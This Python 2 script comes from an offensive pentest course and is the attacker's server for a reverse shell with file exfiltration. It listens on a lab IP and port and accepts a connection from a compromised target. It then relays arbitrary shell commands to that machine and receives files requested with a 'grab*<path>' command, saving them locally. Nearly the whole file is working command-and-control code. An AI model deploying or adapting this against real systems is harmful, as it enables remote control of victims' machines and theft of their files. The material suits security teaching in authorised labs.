# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn https://jo.linkedin.com/in/python2

# TCP Data Exfiltration Server

import socket 
import os # Needed for file operation



# In the transfer function, we first create a trivial file called "test.png" as a file holder just to hold the 
# received bytes , then we go into infinite loop and store the received data into our file holder "test.png", however
# If the requested file doesn't exist or if we reached the end of the file then we will break the loop
# note that we could know the end of the file, if we received the "DONE" tag from the target side

# Keep in mind that you can enhance the code and dynamically change the test.png to other file extension based on the user input


def transfer(conn,command):
    
    conn.send(command)
    f = open('/root/Desktop/test.png','wb')
    while True: 
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Transfer completed '
            f.close()
            break
        f.write(bits)
    
    



def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("10.0.2.15", 8080))
    s.listen(1)
    print 'Listening for incoming TCP connection on port 8080'
    conn, addr = s.accept()
    print '[+] We got a connection from: ', addr



    while True: 
        command = raw_input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close() 
            break


# if we received grab keyword from the user input, then this is an indicator for
# file transfer operation, hence we will call transfer function
            
# Remember the Formula is grab*<File Path>
# Example: grab*C:\Users\Hussam\Desktop\photo.jpeg

        elif 'grab' in command: 
            transfer(conn,command)

        else:
            conn.send(command) 
            print conn.recv(1024) 
        
def main ():
    connect()
main()